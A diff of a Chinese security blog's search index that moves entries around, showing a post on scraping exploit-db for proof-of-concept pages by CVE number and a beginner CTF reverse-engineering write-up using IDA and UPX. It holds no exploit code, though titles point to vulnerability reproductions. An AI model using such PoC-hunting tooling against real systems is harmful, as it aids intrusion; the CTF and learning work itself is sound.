@@ -1,44 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>0x01python-spider-exploit-db</title>
-    <url>/2020/12/03/0x01python-spider-exploit-db/</url>
-    <content><![CDATA[<p>在一次寻找大批量的久远漏洞的poc的时候，我这个python小白决定顺手写个exploit-db的爬虫</p>
-<a id="more"></a>
-
-<p>这类爬虫的项目其实还是有蛮多可以参考的</p>
-<p>我的主要需求：已知cve号，搜索是否有poc并返回poc页面</p>
-<p>先进行一次搜索流程</p>
-<p>在输入框输入cve号，页面就会显示出链接</p>
-<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105144411007.png" alt="image-20210105144411007"></p>
-<p>点击后，这个就是我们需要的poc的url：<a href="https://www.exploit-db.com/exploits/49068">https://www.exploit-db.com/exploits/49068</a></p>
-<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105144437086.png" alt="image-20210105144437086"></p>
-<p>多尝试几个就可以知道poc的url就是”<a href="https://www.exploit-db.com/exploits/+%E6%9F%90%E6%95%B0%E5%AD%97&quot;%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E6%9F%90%E6%95%B0%E5%AD%97%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E8%BF%94%E5%9B%9E%E7%9A%84">https://www.exploit-db.com/exploits/+某数字&quot;，那么这个某数字就是我们需要返回的</a></p>
-<p>抓包，得到请求包，找到对应的cve号输入的位置search[value]，修改为我们可以输入的参数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;?draw&#x3D;2&amp;columns[0][data]&#x3D;date_published&amp;columns[0][name]&#x3D;date_published&amp;columns[0][searchable]&#x3D;true&amp;columns[0][orderable]&#x3D;true&amp;columns[0][search][value]&#x3D;&amp;columns[0][search][regex]&#x3D;false&amp;columns[1][data]&#x3D;download&amp;columns[1][name]&#x3D;download&amp;columns[1][searchable]&#x3D;false&amp;columns[1][orderable]&#x3D;false&amp;columns[1][search][value]&#x3D;&amp;columns[1][search][regex]&#x3D;false&amp;columns[2][data]&#x3D;application_md5&amp;columns[2][name]&#x3D;application_md5&amp;columns[2][searchable]&#x3D;true&amp;columns[2][orderable]&#x3D;false&amp;columns[2][search][value]&#x3D;&amp;columns[2][search][regex]&#x3D;false&amp;columns[3][data]&#x3D;verified&amp;columns[3][name]&#x3D;verified&amp;columns[3][searchable]&#x3D;true&amp;columns[3][orderable]&#x3D;false&amp;columns[3][search][value]&#x3D;&amp;columns[3][search][regex]&#x3D;false&amp;columns[4][data]&#x3D;description&amp;columns[4][name]&#x3D;description&amp;columns[4][searchable]&#x3D;true&amp;columns[4][orderable]&#x3D;false&amp;columns[4][search][value]&#x3D;&amp;columns[4][search][regex]&#x3D;false&amp;columns[5][data]&#x3D;type_id&amp;columns[5][name]&#x3D;type_id&amp;columns[5][searchable]&#x3D;true&amp;columns[5][orderable]&#x3D;false&amp;columns[5][search][value]&#x3D;&amp;columns[5][search][regex]&#x3D;false&amp;columns[6][data]&#x3D;platform_id&amp;columns[6][name]&#x3D;platform_id&amp;columns[6][searchable]&#x3D;true&amp;columns[6][orderable]&#x3D;false&amp;columns[6][search][value]&#x3D;&amp;columns[6][search][regex]&#x3D;false&amp;columns[7][data]&#x3D;author_id&amp;columns[7][name]&#x3D;author_id&amp;columns[7][searchable]&#x3D;false&amp;columns[7][orderable]&#x3D;false&amp;columns[7][search][value]&#x3D;&amp;columns[7][search][regex]&#x3D;false&amp;columns[8][data]&#x3D;code&amp;columns[8][name]&#x3D;code.code&amp;columns[8][searchable]&#x3D;true&amp;columns[8][orderable]&#x3D;true&amp;columns[8][search][value]&#x3D;&amp;columns[8][search][regex]&#x3D;false&amp;columns[9][data]&#x3D;id&amp;columns[9][name]&#x3D;id&amp;columns[9][searchable]&#x3D;false&amp;columns[9][orderable]&#x3D;true&amp;columns[9][search][value]&#x3D;&amp;columns[9][search][regex]&#x3D;false&amp;order[0][column]&#x3D;9&amp;order[0][dir]&#x3D;desc&amp;start&#x3D;0&amp;length&#x3D;15&amp;search[value]&#x3D;%s&amp;search[regex]&#x3D;false&amp;author&#x3D;&amp;port&#x3D;&amp;type&#x3D;&amp;tag&#x3D;&amp;platform&#x3D;&amp;_&#x3D;1606893892234&#39;%s</span><br></pre></td></tr></table></figure>
-
-<p>刚开始直接获取的是返回的页面的html，但是没有相关数字的信息，一度以为自己写错了，毕竟这算是我第二次写爬虫。后来查看页面源代码，确实没有相关的信息，跑去问gps(前端，才知道是拿了接口返回的数据，塞到网页里</p>
-<p>f12后发现在json数据包里</p>
-<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105145116203.png" alt="image-20210105145116203"></p>
-<p>于是开始研究怎么获取json包的数据</p>
-<p>重点函数：spider_request.json()</p>
-<p>但是一开始使用这个函数一直报错，提示没有返回json，确认了下请求头也没有错误</p>
-<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105150842464.png" alt="image-20210105150842464"></p>
-<p>改了很久，最后将header改为这样就可以了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">header &#x3D; &#123;</span><br><span class="line">    &#39;Accept&#39;: &#39;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&#39;,</span><br><span class="line">    &#39;Sec-Fetch-Mode&#39;: &#39;cors&#39;,</span><br><span class="line">    &#39;User-Agent&#39;: random.choice(ua_list),</span><br><span class="line">    &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行效果：</p>
-<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105151415897.png" alt="image-20210105151415897"></p>
-<p>项目地址：<a href="https://github.com/0xkami/expolit-db-spider">https://github.com/0xkami/expolit-db-spider</a></p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>exploit-db</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>0x01ichunqiu逆向刷题</title>
     <url>/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/</url>
     <content><![CDATA[<h4 id="ichunqiu逆向刷题"><a href="#ichunqiu逆向刷题" class="headerlink" title="ichunqiu逆向刷题"></a>ichunqiu逆向刷题</h4><a id="more"></a>
@@ -175,6 +137,44 @@
       </tags>
   </entry>
   <entry>
+    <title>0x01python-spider-exploit-db</title>
+    <url>/2020/12/03/0x01python-spider-exploit-db/</url>
+    <content><![CDATA[<p>在一次寻找大批量的久远漏洞的poc的时候，我这个python小白决定顺手写个exploit-db的爬虫</p>
+<a id="more"></a>
+
+<p>这类爬虫的项目其实还是有蛮多可以参考的</p>
+<p>我的主要需求：已知cve号，搜索是否有poc并返回poc页面</p>
+<p>先进行一次搜索流程</p>
+<p>在输入框输入cve号，页面就会显示出链接</p>
+<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105144411007.png" alt="image-20210105144411007"></p>
+<p>点击后，这个就是我们需要的poc的url：<a href="https://www.exploit-db.com/exploits/49068">https://www.exploit-db.com/exploits/49068</a></p>
+<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105144437086.png" alt="image-20210105144437086"></p>
+<p>多尝试几个就可以知道poc的url就是”<a href="https://www.exploit-db.com/exploits/+%E6%9F%90%E6%95%B0%E5%AD%97&quot;%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E6%9F%90%E6%95%B0%E5%AD%97%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E8%BF%94%E5%9B%9E%E7%9A%84">https://www.exploit-db.com/exploits/+某数字&quot;，那么这个某数字就是我们需要返回的</a></p>
+<p>抓包，得到请求包，找到对应的cve号输入的位置search[value]，修改为我们可以输入的参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;?draw&#x3D;2&amp;columns[0][data]&#x3D;date_published&amp;columns[0][name]&#x3D;date_published&amp;columns[0][searchable]&#x3D;true&amp;columns[0][orderable]&#x3D;true&amp;columns[0][search][value]&#x3D;&amp;columns[0][search][regex]&#x3D;false&amp;columns[1][data]&#x3D;download&amp;columns[1][name]&#x3D;download&amp;columns[1][searchable]&#x3D;false&amp;columns[1][orderable]&#x3D;false&amp;columns[1][search][value]&#x3D;&amp;columns[1][search][regex]&#x3D;false&amp;columns[2][data]&#x3D;application_md5&amp;columns[2][name]&#x3D;application_md5&amp;columns[2][searchable]&#x3D;true&amp;columns[2][orderable]&#x3D;false&amp;columns[2][search][value]&#x3D;&amp;columns[2][search][regex]&#x3D;false&amp;columns[3][data]&#x3D;verified&amp;columns[3][name]&#x3D;verified&amp;columns[3][searchable]&#x3D;true&amp;columns[3][orderable]&#x3D;false&amp;columns[3][search][value]&#x3D;&amp;columns[3][search][regex]&#x3D;false&amp;columns[4][data]&#x3D;description&amp;columns[4][name]&#x3D;description&amp;columns[4][searchable]&#x3D;true&amp;columns[4][orderable]&#x3D;false&amp;columns[4][search][value]&#x3D;&amp;columns[4][search][regex]&#x3D;false&amp;columns[5][data]&#x3D;type_id&amp;columns[5][name]&#x3D;type_id&amp;columns[5][searchable]&#x3D;true&amp;columns[5][orderable]&#x3D;false&amp;columns[5][search][value]&#x3D;&amp;columns[5][search][regex]&#x3D;false&amp;columns[6][data]&#x3D;platform_id&amp;columns[6][name]&#x3D;platform_id&amp;columns[6][searchable]&#x3D;true&amp;columns[6][orderable]&#x3D;false&amp;columns[6][search][value]&#x3D;&amp;columns[6][search][regex]&#x3D;false&amp;columns[7][data]&#x3D;author_id&amp;columns[7][name]&#x3D;author_id&amp;columns[7][searchable]&#x3D;false&amp;columns[7][orderable]&#x3D;false&amp;columns[7][search][value]&#x3D;&amp;columns[7][search][regex]&#x3D;false&amp;columns[8][data]&#x3D;code&amp;columns[8][name]&#x3D;code.code&amp;columns[8][searchable]&#x3D;true&amp;columns[8][orderable]&#x3D;true&amp;columns[8][search][value]&#x3D;&amp;columns[8][search][regex]&#x3D;false&amp;columns[9][data]&#x3D;id&amp;columns[9][name]&#x3D;id&amp;columns[9][searchable]&#x3D;false&amp;columns[9][orderable]&#x3D;true&amp;columns[9][search][value]&#x3D;&amp;columns[9][search][regex]&#x3D;false&amp;order[0][column]&#x3D;9&amp;order[0][dir]&#x3D;desc&amp;start&#x3D;0&amp;length&#x3D;15&amp;search[value]&#x3D;%s&amp;search[regex]&#x3D;false&amp;author&#x3D;&amp;port&#x3D;&amp;type&#x3D;&amp;tag&#x3D;&amp;platform&#x3D;&amp;_&#x3D;1606893892234&#39;%s</span><br></pre></td></tr></table></figure>
+
+<p>刚开始直接获取的是返回的页面的html，但是没有相关数字的信息，一度以为自己写错了，毕竟这算是我第二次写爬虫。后来查看页面源代码，确实没有相关的信息，跑去问gps(前端，才知道是拿了接口返回的数据，塞到网页里</p>
+<p>f12后发现在json数据包里</p>
+<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105145116203.png" alt="image-20210105145116203"></p>
+<p>于是开始研究怎么获取json包的数据</p>
+<p>重点函数：spider_request.json()</p>
+<p>但是一开始使用这个函数一直报错，提示没有返回json，确认了下请求头也没有错误</p>
+<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105150842464.png" alt="image-20210105150842464"></p>
+<p>改了很久，最后将header改为这样就可以了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">header &#x3D; &#123;</span><br><span class="line">    &#39;Accept&#39;: &#39;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&#39;,</span><br><span class="line">    &#39;Sec-Fetch-Mode&#39;: &#39;cors&#39;,</span><br><span class="line">    &#39;User-Agent&#39;: random.choice(ua_list),</span><br><span class="line">    &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行效果：</p>
+<p><img src="/2020/12/03/0x01python-spider-exploit-db/image-20210105151415897.png" alt="image-20210105151415897"></p>
+<p>项目地址：<a href="https://github.com/0xkami/expolit-db-spider">https://github.com/0xkami/expolit-db-spider</a></p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>exploit-db</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>0x01第一个docker漏洞环境搭建复现fastjson</title>
     <url>/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/</url>
     <content><![CDATA[<h4 id="第一个docker漏洞环境搭建复现"><a href="#第一个docker漏洞环境搭建复现" class="headerlink" title="第一个docker漏洞环境搭建复现"></a>第一个docker漏洞环境搭建复现</h4><p>由于某原因要进行fastjson漏洞的复现，已获得脚本及exp</p>
@@ -262,108 +262,6 @@
         <tag>netlogon</tag>
         <tag>域</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>0x02xctf新手训练题</title>
-    <url>/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/</url>
-    <content><![CDATA[<h4 id="xctf新手训练题"><a href="#xctf新手训练题" class="headerlink" title="xctf新手训练题"></a>xctf新手训练题</h4><a id="more"></a>
-
-<h5 id="0x1-open-source"><a href="#0x1-open-source" class="headerlink" title="0x1 open-source"></a>0x1 open-source</h5><p>下载文件后可以直接看源码</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173337438.png" alt="image-20201022173337438"></p>
-<p>要求是输入4个参数，第一个参数为’0xcafe’，第二个参数是符合判定条件的int值，第三个参数是’h4cky0u’，然后进行一些数据操作得到hash，并用十六进制方式输出（%x）</p>
-<p>编写脚本实现，得到flag为0xc0ffee</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201021172112641.png" alt="image-20201021172112641"></p>
-<h5 id="0x2-simple-unpack"><a href="#0x2-simple-unpack" class="headerlink" title="0x2 simple-unpack"></a>0x2 simple-unpack</h5><p>提示是加了壳的二进制文件，查壳</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173809443.png" alt="image-20201022173809443"></p>
-<p>一开始不知道怎么脱二进制文件的壳，参考：<a href="https://bbs.pediy.com/thread-157645.htm">https://bbs.pediy.com/thread-157645.htm</a></p>
-<p>到软件中提示的地址下载脱壳程序进行脱壳（<a href="https://github.com/upx/upx/releases%EF%BC%89">https://github.com/upx/upx/releases）</a></p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173853002.png" alt="image-20201022173853002"></p>
-<p>脱壳成功后用IDA查看，即得到flag</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174038951.png" alt="image-20201022174038951"></p>
-<h5 id="0x3-logmein"><a href="#0x3-logmein" class="headerlink" title="0x3 logmein"></a>0x3 logmein</h5><p>查看下载的文件</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174115535.png" alt="image-20201022174115535"></p>
-<p>用IDA找到对应关键字进行分析</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174143070.png" alt="image-20201022174143070"></p>
-<p>重点函数：</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201023171541380.png" alt="image-20201023171541380"></p>
-<p>编写脚本即可</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201023171351848.png" alt="image-20201023171351848"></p>
-<p>注意：小端模式</p>
-<h5 id="0x4-insanity"><a href="#0x4-insanity" class="headerlink" title="0x4 insanity"></a>0x4 insanity</h5><p>下载文件后直接编辑器就能查看到flag</p>
-<h5 id="0x5-getit"><a href="#0x5-getit" class="headerlink" title="0x5 getit"></a>0x5 getit</h5><p>IDA中反编译</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174234603.png" alt="image-20201022174234603"></p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174338459.png" alt="image-20201022174338459"></p>
-<p>可以看到t就是flag，我们需要知道？的数值，编写脚本即可得到flag</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022111119084.png" alt="image-20201022111119084"></p>
-<p>此题注意：python中字符串是不可以直接操作修改的，可以先改为列表，然后重新生成</p>
-<h5 id="0x6-python-trade"><a href="#0x6-python-trade" class="headerlink" title="0x6 python-trade"></a>0x6 python-trade</h5><p>.pyc后缀的文件，直接用EasyPythonDecompiler解了，获得源码</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/24CD274DE2E7A49AC28DC75BFF631FA2.png" alt="24CD274DE2E7A49AC28DC75BFF631FA2"></p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/CF034599DBEAC7285F7E5C9C744EBB6D.png" alt="CF034599DBEAC7285F7E5C9C744EBB6D"></p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/BB56738DB65555D9FF8F1424320439CB.png" alt="BB56738DB65555D9FF8F1424320439CB"></p>
-<p>可以看到操作：对输入的字符串进行自定义的encode操作然后用base64加密</p>
-<p>编写脚本解码即得flag</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022113051197.png" alt="image-20201022113051197"></p>
-<h5 id="0x7-re1"><a href="#0x7-re1" class="headerlink" title="0x7 re1"></a>0x7 re1</h5><p>放进IDA查看</p>
-<p>查看主函数，可以看到只要输入的字符串和v5相同就可以了，找到对应v5的值即可得flag</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183057868.png" alt="image-20201022183057868"></p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175340918.png" alt="image-20201022175340918"></p>
-<h5 id="0x8-Hello-CTF"><a href="#0x8-Hello-CTF" class="headerlink" title="0x8 Hello,CTF"></a>0x8 Hello,CTF</h5><p>用IDA打开，找到主要函数</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175837176.png" alt="image-20201022175837176"></p>
-<p>从下面的循环判定值为17和上面v13的长度为34猜测出两位代表一个字符</p>
-<p>十六进制转ASCII即可得flag</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175959301.png" alt="image-20201022175959301"></p>
-<h5 id="0x9-no-string-attached"><a href="#0x9-no-string-attached" class="headerlink" title="0x9 no-string-attached"></a>0x9 no-string-attached</h5><p>IDA中查看主函数</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180039861.png" alt="image-20201022180039861"></p>
-<p>进入每个函数看看</p>
-<p>先看banner()</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180101213.png" alt="image-20201022180101213"></p>
-<p>就是打印一些东西，查看对应打印的数值（unk_80488B0和8048960）</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180251090.png" alt="image-20201022180251090"></p>
-<p>可以看到是两个字符串，就是一些欢迎的信息之类的</p>
-<p>查看下一个，也是打印一些信息，需要你输入字符串</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180356018.png" alt="image-20201022180356018"></p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180449834.png" alt="image-20201022180449834"></p>
-<p>再看下一个，是主函数了，只要输入的函数和s2相同即可，s2是两个输入进行decrypt操作后得到的值</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180527832.png" alt="image-20201022180527832"></p>
-<p>看decrypt,对两个宽字节进行了操作。编写脚本实现功能即可得flag</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180623954.png" alt="image-20201022180623954"></p>
-<p> <img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022141847145.png" alt="image-20201022141847145"></p>
-<h5 id="0xA-csaw2013reversing2"><a href="#0xA-csaw2013reversing2" class="headerlink" title="0xA csaw2013reversing2"></a>0xA csaw2013reversing2</h5><p>IDA中看主函数</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180506157.png" alt="image-20201022180506157"></p>
-<p>通过运行程序，发现并不会进入if的判定。</p>
-<p>lpMem+1就是我们需要知道的乱码消息</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181008895.png" alt="image-20201022181008895"></p>
-<p>可以知道通过memcpy_s操作将unk_409B10的数据给了lpMem</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181020276.png" alt="image-20201022181020276"></p>
-<p>查看sub_401000</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181112925.png" alt="image-20201022181112925"></p>
-<p>是对lpMem进行了一些操作的，猜测是由于并没有运行，所以出现乱码</p>
-<p>用IDA动态调试（debugger），下断点</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181352168.png" alt="image-20201022181352168"></p>
-<p>跳过进入判定后的ExitProcess()，直接跳到下面弹出messageboxA的地方，就能得到flag了</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181317768.png" alt="image-20201022181317768"></p>
-<h5 id="0xB-maze"><a href="#0xB-maze" class="headerlink" title="0xB maze"></a>0xB maze</h5><p>看题目就知道是一个迷宫题</p>
-<p>IDA中找主函数</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181455862.png" alt="image-20201022181455862"></p>
-<p>看到这四个不同函数的判断，猜测应该就是上下左右了</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181522773.png" alt="image-20201022181522773"></p>
-<p>分别点进去查看，得知’O’为左，’o’为右，’.’为上，’0’为下，并且在函数中有规定了8这个边界值</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181719854.png" alt="image-20201022181719854"></p>
-<p>接下来找迷宫和终点</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181743142.png" alt="image-20201022181743142"></p>
-<p>通过最终判定的条件，可以知道终点是’#’</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181833592.png" alt="image-20201022181833592"></p>
-<p>601060就是需要找的迷宫</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183115702.png" alt="image-20201022183115702"></p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183129721.png" alt="image-20201022183129721"></p>
-<p>在HEX界面查看</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181923615.png" alt="image-20201022181923615"></p>
-<p>根据边界值8重新排列，23就是终点，只走20即可得flag</p>
-<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022182143651.png" alt="image-20201022182143651"></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
   </entry>
   <entry>
     <title>0x03CVE-2020-14644 weblogic iiop反序列化漏洞分析</title>
@@ -553,6 +451,108 @@
 <p>那么我们就可以编写脚本，最终可得到flag，其中对j判断的0，9，10等数字就是从字符串第一次变换里得到的范围</p>
 <p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103161208429.png" alt="image-20201103161208429"></p>
 <h5 id="第一页题目完成"><a href="#第一页题目完成" class="headerlink" title="第一页题目完成:"></a>第一页题目完成:</h5><p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103160209798.png" alt="image-20201103160209798"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>0x02xctf新手训练题</title>
+    <url>/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/</url>
+    <content><![CDATA[<h4 id="xctf新手训练题"><a href="#xctf新手训练题" class="headerlink" title="xctf新手训练题"></a>xctf新手训练题</h4><a id="more"></a>
+
+<h5 id="0x1-open-source"><a href="#0x1-open-source" class="headerlink" title="0x1 open-source"></a>0x1 open-source</h5><p>下载文件后可以直接看源码</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173337438.png" alt="image-20201022173337438"></p>
+<p>要求是输入4个参数，第一个参数为’0xcafe’，第二个参数是符合判定条件的int值，第三个参数是’h4cky0u’，然后进行一些数据操作得到hash，并用十六进制方式输出（%x）</p>
+<p>编写脚本实现，得到flag为0xc0ffee</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201021172112641.png" alt="image-20201021172112641"></p>
+<h5 id="0x2-simple-unpack"><a href="#0x2-simple-unpack" class="headerlink" title="0x2 simple-unpack"></a>0x2 simple-unpack</h5><p>提示是加了壳的二进制文件，查壳</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173809443.png" alt="image-20201022173809443"></p>
+<p>一开始不知道怎么脱二进制文件的壳，参考：<a href="https://bbs.pediy.com/thread-157645.htm">https://bbs.pediy.com/thread-157645.htm</a></p>
+<p>到软件中提示的地址下载脱壳程序进行脱壳（<a href="https://github.com/upx/upx/releases%EF%BC%89">https://github.com/upx/upx/releases）</a></p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173853002.png" alt="image-20201022173853002"></p>
+<p>脱壳成功后用IDA查看，即得到flag</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174038951.png" alt="image-20201022174038951"></p>
+<h5 id="0x3-logmein"><a href="#0x3-logmein" class="headerlink" title="0x3 logmein"></a>0x3 logmein</h5><p>查看下载的文件</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174115535.png" alt="image-20201022174115535"></p>
+<p>用IDA找到对应关键字进行分析</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174143070.png" alt="image-20201022174143070"></p>
+<p>重点函数：</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201023171541380.png" alt="image-20201023171541380"></p>
+<p>编写脚本即可</p>
